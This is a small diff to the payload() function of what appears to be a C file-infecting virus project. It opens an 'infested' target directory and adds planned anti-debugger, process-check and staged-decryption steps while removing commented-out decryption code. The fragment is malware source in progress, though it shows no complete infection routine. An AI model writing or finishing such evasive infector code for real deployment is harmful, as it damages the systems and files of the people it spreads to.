@@ -54,16 +54,13 @@ void payload()
 	t_data data;
 	int fd;
 	char infested_dir[] = INFESTED_DIR;
-	u64  ret;
 	char hello[] = "Hello there\n";
 
+	// check if in debugger
+	// check if pid running
+	// decrypt next, go next
 	WRITE(1, hello, sizeof(hello));
-	ret = get_rel_addr();
 	data.infos.pl_size = &payload_end - &payload_start;
-	// data.key = 0xdeadbeaf;
-	// data.decrypt_start = 0xdeadbeaf;
-	//mprotect_us();
-	//decrypt();
 	fd = OPEN(infested_dir, O_RDONLY | O_DIRECTORY);
 	if (fd < 0)
 		payload_end();
